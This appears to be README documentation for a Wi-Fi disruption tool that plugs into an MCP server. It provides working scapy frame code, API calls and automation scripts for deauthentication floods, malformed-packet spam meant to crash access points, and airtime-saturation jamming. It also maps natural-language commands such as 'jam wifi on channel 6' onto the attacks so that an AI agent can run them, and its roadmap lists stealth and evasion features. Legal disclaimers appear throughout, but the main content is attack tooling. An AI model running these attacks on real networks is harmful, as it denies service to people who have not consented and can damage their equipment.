# Wi-Fi Disruption Tool

## Overview

The Wi-Fi Disruption Tool (`wifi_disrupt`) is a protocol-aware Wi-Fi interference system that uses standard Wi-Fi NICs in monitor mode to disrupt targeted Wi-Fi networks without raw RF noise. This tool implements sophisticated 802.11 frame manipulation to achieve targeted service disruption through deauthentication attacks, malformed packet flooding, and airtime occupation.

## Key Features

### 🎯 **Protocol-Aware Interference**
- Uses 802.11 management and control frames instead of broad-spectrum RF jamming
- Targets specific networks, channels, and devices
- Maintains stealth by operating within Wi-Fi protocol standards

### 🔧 **Multiple Disruption Modes**
- **Deauthentication Flood**: Sends deauth frames to disconnect clients from access points
- **Malformed Packet Spam**: Transmits invalid 802.11 frames to crash/confuse vulnerable APs
- **Airtime Occupation**: Saturates the medium with junk data frames to block legitimate traffic

### 🌍 **Cross-Platform Support**
- **Linux**: Full support via scapy + airmon-ng (requires root)
- **Windows**: Injection via scapy + Npcap; monitor mode via compatible drivers
- **macOS**: scapy + airport for monitor mode; limited injection without 3rd-party kexts
- **Android**: Via Termux + root; requires compatible hardware (e.g., BCM43xx chips)
- **iOS**: Simulated only (no injection without jailbreak)

### 🧠 **Natural Language Interface**
- Parse commands like "Jam the AP on channel 6" into executable parameters
- Intelligent parameter extraction from natural language descriptions
- Integration with MCP's NLP routing system

## Technical Specifications

### Requirements
- **Python 3.8+**: scapy>=2.4.0
- **Root/Admin Privileges**: Required for monitor mode and packet injection
- **Compatible NIC**: Must support monitor mode and packet injection
  - Recommended: Intel AX200, Atheros AR9271, Ralink RT3070
- **Platform Dependencies**:
  - Linux: airmon-ng, iwconfig
  - Windows: Npcap (WinPcap successor)
  - macOS: airport utility
  - Android: Termux + root access
  - iOS: Jailbreak + Cydia tools (limited functionality)

### Installation
```bash
# Install Python dependencies
pip install scapy>=2.4.0

# Platform-specific setup
# Linux
sudo apt-get install aircrack-ng

# Windows
# Download and install Npcap from https://npcap.com/

# macOS
# airport utility is included with macOS

# Android (Termux)
pkg install python scapy-python3
```

## Usage

### Basic API Usage

#### Deauthentication Attack
```typescript
// Disconnect clients from a specific AP
{
  "action": "deauth_flood",
  "interface": "wlan0",
  "target_bssid": "AA:BB:CC:DD:EE:FF",
  "channel": 6,
  "duration": 30
}
```

#### Malformed Packet Spam
```typescript
// Crash/confuse vulnerable access points
{
  "action": "malformed_spam",
  "interface": "wlan0",
  "channel": 11,
  "duration": 15
}
```

#### Airtime Occupation
```typescript
// Saturate the medium to block legitimate traffic
{
  "action": "airtime_occupation",
  "interface": "wlan0",
  "channel": 1,
  "duration": 60
}
```

### Natural Language Commands

The tool supports natural language parsing for intuitive operation:

```typescript
// Parse natural language command
{
  "action": "parse_nl_command",
  "nl_command": "Jam the AP on channel 6 for 30 seconds"
}
```

**Supported Natural Language Patterns:**
- "Disrupt wifi network on channel 6"
- "Jam wireless signal for 30 seconds"
- "Flood deauth packets to AA:BB:CC:DD:EE:FF"
- "Interfere with wifi access point"
- "Knock clients off wifi network"
- "Crash wifi access point with malformed packets"

### Python Standalone Usage

```python
from wifi_disrupt import WifiDisruptTool

# Initialize tool
tool = WifiDisruptTool()

# Execute deauthentication attack
result = tool.execute(
    interface='wlan0',
    mode='deauth',
    target_bssid='AA:BB:CC:DD:EE:FF',
    channel=6,
    duration=30
)

print(result)
# {'status': 'success', 'details': 'deauth disruption completed on channel 6.', 'packets_sent': 1200}
```

## Parameters

### Required Parameters
- **interface**: Wi-Fi interface name (e.g., 'wlan0', 'Wi-Fi')
- **mode**: Disruption mode ('deauth', 'malformed', 'airtime')

### Optional Parameters
- **target_bssid**: Target AP/client BSSID or 'all' for broadcast
- **channel**: Wi-Fi channel (1-13 for 2.4GHz, 36+ for 5GHz)
- **duration**: Duration in seconds (default: 10)
- **power**: TX power in dBm (default: 20)
- **auto_confirm**: Skip confirmation prompt (requires proper authorization)

## Output Format

```json
{
  "success": true,
  "wifi_disrupt_data": {
    "action": "deauth_flood",
    "mode": "deauth",
    "interface": "wlan0",
    "target_bssid": "AA:BB:CC:DD:EE:FF",
    "channel": 6,
    "duration": 30,
    "packets_sent": 1200,
    "status": "success",
    "details": "Deauth flood completed on channel 6",
    "platform_info": {
      "os": "linux",
      "is_mobile": false,
      "scapy_available": true
    },
    "ethical_warning": "⚠️ LEGAL WARNING: Use only on networks you own or have explicit permission for. Disruption can violate laws like CFAA (US)."
  }
}
```

## Security and Legal Considerations

### ⚠️ **Legal Warning**
This tool is designed for authorized security testing only. Unauthorized use may violate laws including:
- **Computer Fraud and Abuse Act (CFAA)** - United States
- **Computer Misuse Act** - United Kingdom
- **Cybercrime Prevention Act** - Philippines
- Various international cybercrime laws

### 🔒 **Ethical Guidelines**
- **Authorized Testing Only**: Use only on networks you own or have explicit written permission to test
- **Scope Limitations**: Clearly define and limit the scope of testing
- **Documentation**: Maintain detailed logs of all testing activities
- **Responsible Disclosure**: Report vulnerabilities through proper channels

### 🛡️ **Safety Measures**
- **Confirmation Required**: Tool requires explicit confirmation for execution
- **Audit Logging**: All operations are logged for compliance and accountability
- **Rate Limiting**: Built-in throttling to prevent self-DoS and excessive interference
- **Platform Validation**: Checks for proper permissions and hardware compatibility

## Technical Implementation

### Architecture
```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   MCP Client    │───▶│  Natural Language │───▶│  Wi-Fi Disrupt  │
│                 │    │     Router        │    │      Tool       │
└─────────────────┘    └──────────────────┘    └─────────────────┘
                                                         │
                                                         ▼
                                               ┌─────────────────┐
                                               │   Scapy Engine  │
                                               │  (Python/Node)  │
                                               └─────────────────┘
                                                         │
                                                         ▼
                                               ┌─────────────────┐
                                               │  Wi-Fi NIC      │
                                               │ (Monitor Mode)  │
                                               └─────────────────┘
```

### Frame Types Used

#### Deauthentication Frames
```python
# 802.11 Deauthentication Frame
RadioTap() / Dot11(
    addr1=target_bssid,      # Destination (client or broadcast)
    addr2=interface_mac,     # Source (attacker)
    addr3=target_bssid       # BSSID (access point)
) / Dot11Deauth(reason=7)    # Reason code 7 (Class 3 frame received from nonassociated station)
```

#### Malformed Frames
```python
# Invalid 802.11 Frame
RadioTap() / Dot11(subtype=0xf) / Raw(b'\x00' * 100)  # Invalid subtype + junk data
```

#### Airtime Occupation Frames
```python
# Large Data Frames
RadioTap() / Dot11(
    addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
    addr2=interface_mac,        # Source
    addr3="ff:ff:ff:ff:ff:ff"   # Broadcast
) / Raw(os.urandom(1500))       # Maximum payload size
```

## Troubleshooting

### Common Issues

#### Monitor Mode Failure
```bash
# Linux - Check interface support
iw list | grep -A 10 "Supported interface modes"

# Enable monitor mode manually
sudo airmon-ng start wlan0
```

#### Permission Denied
```bash
# Ensure root privileges
sudo python3 wifi_disrupt.py --interface wlan0 --mode deauth

# Check interface permissions
ls -la /sys/class/net/wlan0/
```

#### Scapy Import Error
```bash
# Install scapy
pip install scapy

# Verify installation
python3 -c "import scapy; print('Scapy available')"
```

### Platform-Specific Issues

#### Windows
- Ensure Npcap is installed and WinPcap compatibility mode is disabled
- Run as Administrator
- Check Windows Firewall settings

#### macOS
- Limited packet injection without third-party kernel extensions
- Use airport utility for monitor mode setup
- Consider using external USB Wi-Fi adapters

#### Android
- Requires rooted device with Termux
- Hardware must support monitor mode (check chipset compatibility)
- Use `su` commands for interface configuration

#### iOS
- No native support without jailbreak
- Consider external hardware solutions
- Use simulation mode for testing

## Integration Examples

### MCP Integration
```typescript
// Register with MCP server
import { registerWifiDisrupt } from './tools/wireless/wifi_disrupt.js';

// Register tool
registerWifiDisrupt(server);
```

### Natural Language Integration
```typescript
// Route natural language commands
const routing = routeNaturalLanguageQuery("jam wifi on channel 6");
// Returns: { suggestedTools: ['wifi_disrupt'], confidence: 0.9, ... }
```

### Custom Automation
```python
# Custom automation script
def automated_wifi_test():
    tool = WifiDisruptTool()
    
    # Test different channels
    for channel in [1, 6, 11]:
        result = tool.execute(
            interface='wlan0',
            mode='deauth',
            channel=channel,
            duration=10
        )
        print(f"Channel {channel}: {result['packets_sent']} packets sent")
```

## Advanced Configuration

### Custom Frame Crafting
```python
# Advanced frame customization
def custom_deauth_frame(target_bssid, client_mac, reason_code=7):
    return RadioTap() / Dot11(
        addr1=client_mac,        # Specific client
        addr2=target_bssid,      # AP BSSID
        addr3=target_bssid       # AP BSSID
    ) / Dot11Deauth(reason=reason_code)
```

### Rate Limiting
```python
# Custom rate limiting
def controlled_flood(interface, packets_per_second=100):
    for i in range(packets_per_second):
        sendp(packet, iface=interface, verbose=False)
        time.sleep(1.0 / packets_per_second)
```

## Performance Optimization

### Hardware Recommendations
- **Intel AX200/AX210**: Excellent monitor mode and injection support
- **Atheros AR9271**: Reliable USB adapter with good Linux support
- **Ralink RT3070**: Budget option with decent performance

### Software Optimization
- Use specific channels to reduce interference
- Implement proper rate limiting to avoid self-DoS
- Monitor system resources during extended operations

## Future Enhancements

### Planned Features
- **WPA3 Support**: Enhanced frame crafting for WPA3 networks
- **5GHz Band**: Extended support for 5GHz channels
- **Advanced Targeting**: Client-specific disruption capabilities
- **Stealth Mode**: Enhanced evasion techniques
- **Real-time Monitoring**: Live feedback during operations

### Community Contributions
- Additional platform support
- Enhanced frame types
- Improved natural language parsing
- Advanced evasion techniques

## Support and Resources

### Documentation
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [802.11 Frame Types](https://en.wikipedia.org/wiki/802.11_Frame_Types)
- [Wi-Fi Security Standards](https://www.wi-fi.org/discover-wi-fi/security)

### Community
- [MCP God Mode GitHub](https://github.com/your-repo/mcp-god-mode)
- [Security Testing Forums](https://example.com/security-forums)
- [Wi-Fi Security Research](https://example.com/wifi-research)

### Professional Services
- Authorized penetration testing services
- Wi-Fi security consulting
- Custom tool development

---

**⚠️ DISCLAIMER**: This tool is provided for educational and authorized testing purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. The authors and contributors are not responsible for any misuse or legal consequences arising from the use of this tool.
